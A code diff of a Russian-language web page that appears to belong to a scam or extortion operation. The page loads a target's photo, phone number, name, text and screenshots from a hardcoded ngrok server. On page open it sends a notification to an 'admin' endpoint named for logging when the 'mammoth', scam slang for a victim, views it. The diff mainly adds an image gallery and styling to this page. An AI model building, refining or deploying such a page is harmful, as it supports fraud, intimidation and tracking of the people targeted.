@@ -29,22 +29,130 @@
         .header { color: #ff3355; font-size: 24px; font-weight: bold; text-transform: uppercase; letter-spacing: 4px; margin-bottom: 10px; animation: pulse 1.5s infinite; }
         @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
         .subheader { color: #ff6680; font-size: 15px; margin-bottom: 25px; }
+        
+        /* ===== ФОТО С КУРСОРОМ ===== */
         .user-photo {
-            width: 250px; height: 250px; border-radius: 50%; border: 4px solid #ff3355;
-            margin: 0 auto 25px; display: flex; align-items: center; justify-content: center;
-            font-size: 60px; color: #444; background: #1a1a1a; overflow: hidden;
-            box-shadow: 0 0 30px rgba(255, 51, 85, 0.3); transition: transform 0.3s ease;
+            width: 250px;
+            height: 250px;
+            border-radius: 50%;
+            border: 4px solid #ff3355;
+            margin: 0 auto 25px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 60px;
+            color: #444;
+            background: #1a1a1a;
+            overflow: hidden;
+            box-shadow: 0 0 30px rgba(255, 51, 85, 0.3);
+            transition: transform 0.3s ease;
+            cursor: pointer;
         }
         .user-photo:hover { transform: scale(1.05); }
-        .user-photo img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; }
+        .user-photo img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; pointer-events: none; }
+        
+        /* ===== СКРИНШОТЫ С КУРСОРОМ ===== */
+        .screenshots img {
+            width: 100%;
+            border-radius: 8px;
+            border: 1px solid rgba(255,255,255,0.1);
+            background: #1a1a1a;
+            min-height: 80px;
+            object-fit: cover;
+            cursor: pointer;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+        }
+        .screenshots img:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 20px rgba(255, 51, 85, 0.3);
+        }
+        .screenshots .empty { cursor: default; }
+        .screenshots .empty:hover { transform: none; box-shadow: none; }
+        
+        /* ===== МОДАЛЬНОЕ ОКНО ДЛЯ ПРОСМОТРА ФОТО ===== */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            animation: fadeIn 0.3s ease;
+        }
+        .modal.active {
+            display: flex;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        .modal img {
+            max-width: 100%;
+            max-height: 90vh;
+            border-radius: 10px;
+            border: 2px solid #ff3355;
+            box-shadow: 0 0 60px rgba(255, 51, 85, 0.3);
+            object-fit: contain;
+            animation: zoomIn 0.3s ease;
+        }
+        @keyframes zoomIn {
+            from { transform: scale(0.9); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+        .modal-close {
+            position: fixed;
+            top: 20px;
+            right: 30px;
+            color: #fff;
+            font-size: 40px;
+            font-weight: bold;
+            cursor: pointer;
+            z-index: 10000;
+            transition: 0.3s;
+            background: rgba(255, 51, 85, 0.2);
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 2px solid rgba(255, 255, 255, 0.2);
+        }
+        .modal-close:hover {
+            background: rgba(255, 51, 85, 0.4);
+            transform: rotate(90deg);
+            border-color: #ff3355;
+        }
+        .modal-counter {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            color: #888;
+            font-size: 14px;
+            background: rgba(0,0,0,0.7);
+            padding: 8px 20px;
+            border-radius: 20px;
+            border: 1px solid rgba(255,255,255,0.1);
+            z-index: 10000;
+        }
+        
         .info-block {
-            background: rgba(0,0,0,0.5); border: 1px solid rgba(255,51,85,0.2);
-            border-radius: 10px; padding: 15px; margin-bottom: 15px; text-align: left;
+            background: rgba(0,0,0,0.5);
+            border: 1px solid rgba(255,51,85,0.2);
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 15px;
+            text-align: left;
         }
         .info-block .label { color: #ff6680; font-size: 12px; text-transform: uppercase; letter-spacing: 2px; font-weight: bold; }
         .info-block .value { color: #00ffcc; font-size: 15px; margin-top: 8px; word-break: break-word; max-height: 300px; overflow-y: auto; white-space: pre-wrap; line-height: 1.6; }
         .screenshots { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 15px 0; }
-        .screenshots img { width: 100%; border-radius: 8px; border: 1px solid rgba(255,255,255,0.1); background: #1a1a1a; min-height: 80px; object-fit: cover; }
         .screenshots .empty { background: #1a1a1a; height: 100px; border-radius: 8px; display: flex; align-items: center; justify-content: center; color: #444; font-size: 12px; border: 1px dashed #333; }
         .status { color: #ff3355; font-size: 16px; animation: blink 1s infinite; margin: 20px 0; font-weight: bold; text-transform: uppercase; letter-spacing: 2px; }
         @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
@@ -93,6 +201,13 @@
         </div>
     </div>
 
+    <!-- ===== МОДАЛЬНОЕ ОКНО ДЛЯ ПРОСМОТРА ФОТО ===== -->
+    <div class="modal" id="modal">
+        <span class="modal-close" id="modalClose">✕</span>
+        <img id="modalImage" src="" alt="Увеличенное фото">
+        <div class="modal-counter" id="modalCounter"></div>
+    </div>
+
     <script>
         // ============================================================
         // ПОЛУЧАЕМ ID ИЗ URL (например /abc123)
@@ -100,66 +215,103 @@
         const path = window.location.pathname;
         const shortId = path.substring(1);
         
-        // ===== NGROK АДРЕС =====
         const NGROK_URL = 'https://2d2b-178-88-32-33.ngrok-free.app';
         
         console.log('🔍 ID из URL:', shortId);
         
+        // ============================================================
+        // ПЕРЕМЕННЫЕ ДЛЯ ГАЛЕРЕИ
+        // ============================================================
+        let allImages = [];
+        let currentImageIndex = 0;
+        const modal = document.getElementById('modal');
+        const modalImage = document.getElementById('modalImage');
+        const modalCounter = document.getElementById('modalCounter');
+        const modalClose = document.getElementById('modalClose');
+        
+        // ============================================================
+        // ФУНКЦИЯ ОТКРЫТИЯ МОДАЛЬНОГО ОКНА
+        // ============================================================
+        function openModal(index) {
+            if (allImages.length === 0) return;
+            currentImageIndex = index;
+            modalImage.src = allImages[index];
+            modalCounter.textContent = `${index + 1} / ${allImages.length}`;
+            modal.classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+        
+        function closeModal() {
+            modal.classList.remove('active');
+            document.body.style.overflow = '';
+        }
+        
+        // ============================================================
+        // ЗАКРЫТИЕ ПО КЛИКУ НА ФОН
+        // ============================================================
+        modal.addEventListener('click', function(e) {
+            if (e.target === modal) closeModal();
+        });
+        
+        modalClose.addEventListener('click', closeModal);
+        
+        // ============================================================
+        // КЛАВИШИ ВЛЕВО/ВПРАВО ДЛЯ ГАЛЕРЕИ
+        // ============================================================
+        document.addEventListener('keydown', function(e) {
+            if (!modal.classList.contains('active')) return;
+            if (e.key === 'Escape') closeModal();
+            if (e.key === 'ArrowRight') {
+                e.preventDefault();
+                currentImageIndex = (currentImageIndex + 1) % allImages.length;
+                modalImage.src = allImages[currentImageIndex];
+                modalCounter.textContent = `${currentImageIndex + 1} / ${allImages.length}`;
+            }
+            if (e.key === 'ArrowLeft') {
+                e.preventDefault();
+                currentImageIndex = (currentImageIndex - 1 + allImages.length) % allImages.length;
+                modalImage.src = allImages[currentImageIndex];
+                modalCounter.textContent = `${currentImageIndex + 1} / ${allImages.length}`;
+            }
+        });
+        
         if (shortId) {
-            // ============================================================
-            // ДОБАВЛЯЕМ ЗАГОЛОВОК ДЛЯ NGROK!
-            // ============================================================
             const headers = new Headers();
             headers.append('ngrok-skip-browser-warning', 'true');
             
             // ============================================================
-            // 0. ОТПРАВЛЯЕМ УВЕДОМЛЕНИЕ АДМИНУ, ЧТО МАМОНТ ОТКРЫЛ СТРАНИЦУ
+            // ОТПРАВКА УВЕДОМЛЕНИЯ АДМИНУ
             // ============================================================
             const notifyUrl = `${NGROK_URL}/log_mammoth_view/${shortId}`;
             console.log('📢 Отправка уведомления админу:', notifyUrl);
             
             fetch(notifyUrl, { headers })
-                .then(response => {
-                    console.log('📢 Статус ответа уведомления:', response.status);
-                    if (!response.ok) {
-                        console.error('❌ Ошибка уведомления: HTTP', response.status);
-                    }
-                    return response.json();
-                })
-                .then(data => {
-                    console.log('✅ Уведомление отправлено:', data);
-                })
-                .catch(error => {
-                    console.error('❌ Ошибка отправки уведомления:', error);
-                    // ПРОБУЕМ ЕЩЁ РАЗ ЧЕРЕЗ 2 СЕКУНДЫ
-                    setTimeout(() => {
-                        fetch(notifyUrl, { headers })
-                            .then(response => response.json())
-                            .then(data => console.log('✅ Уведомление отправлено (повтор):', data))
-                            .catch(e => console.error('❌ Вторая попытка не удалась:', e));
-                    }, 2000);
-                });
+                .then(response => response.json())
+                .then(data => console.log('✅ Уведомление отправлено:', data))
+                .catch(error => console.error('❌ Ошибка уведомления:', error));
             
             // ============================================================
-            // 1. ЗАГРУЖАЕМ ФОТО С СЕРВЕРА
+            // 1. ЗАГРУЖАЕМ ФОТО
             // ============================================================
             const photoUrl = `${NGROK_URL}/photo/${shortId}`;
             console.log('📸 Запрос фото:', photoUrl);
             
             fetch(photoUrl, { headers })
                 .then(response => {
-                    console.log('📸 Статус ответа фото:', response.status);
                     if (!response.ok) throw new Error(`HTTP ${response.status}`);
                     return response.blob();
                 })
                 .then(blob => {
                     console.log('📸 Фото получено, размер:', blob.size, 'байт');
+                    const url = URL.createObjectURL(blob);
+                    allImages.push(url);
+                    
                     const img = document.createElement('img');
-                    img.src = URL.createObjectURL(blob);
+                    img.src = url;
                     img.alt = 'Фото пользователя';
-                    img.onerror = function() {
-                        this.parentElement.innerHTML = '<span>❌ Ошибка загрузки фото</span>';
-                    };
+                    img.style.cursor = 'pointer';
+                    img.onclick = function() { openModal(0); };
+                    
                     document.getElementById('userPhoto').innerHTML = '';
                     document.getElementById('userPhoto').appendChild(img);
                 })
@@ -169,14 +321,13 @@
                 });
             
             // ============================================================
-            // 2. ЗАГРУЖАЕМ ДАННЫЕ (ТЕЛЕФОН, ИМЯ, ТЕКСТ)
+            // 2. ЗАГРУЖАЕМ ДАННЫЕ
             // ============================================================
             const dataUrl = `${NGROK_URL}/${shortId}`;
             console.log('📡 Запрос данных:', dataUrl);
             
             fetch(dataUrl, { headers })
                 .then(response => {
-                    console.log('📡 Статус ответа данных:', response.status);
                     if (!response.ok) throw new Error(`HTTP ${response.status}`);
                     return response.json();
                 })
@@ -191,9 +342,21 @@
                         if (data.screenshots && data.screenshots.length > 0) {
                             const container = document.getElementById('screenshots');
                             container.innerHTML = '';
-                            data.screenshots.forEach(src => {
+                            
+                            data.screenshots.forEach((src, index) => {
                                 const img = document.createElement('img');
-                                img.src = 'data:image/jpeg;base64,' + src;
+                                const imgUrl = 'data:image/jpeg;base64,' + src;
+                                img.src = imgUrl;
+                                img.alt = 'Скриншот ' + (index + 1);
+                                img.style.cursor = 'pointer';
+                                
+                                // Добавляем в галерею
+                                allImages.push(imgUrl);
+                                
+                                // Открываем по клику
+                                const imgIndex = allImages.length - 1;
+                                img.onclick = function() { openModal(imgIndex); };
+                                
                                 img.onerror = function() {
                                     this.outerHTML = `<div class="empty">❌ Ошибка загрузки скриншота</div>`;
                                 };
@@ -207,15 +370,11 @@
                 .catch(error => {
                     console.error('❌ Ошибка загрузки данных:', error);
                     document.getElementById('userData').textContent = '❌ Ошибка загрузки: ' + error.message;
-                    document.getElementById('userPhone').textContent = '❌ Ошибка';
-                    document.getElementById('userName').textContent = '❌ Ошибка';
                 });
         } else {
             document.getElementById('userData').textContent = '❌ Нет ID для загрузки';
-            console.log('❌ shortId не найден в URL');
         }
         
-        // ===== ВРЕМЯ =====
         document.getElementById('time').textContent = new Date().toLocaleString('ru-RU');
     </script>
 </body>
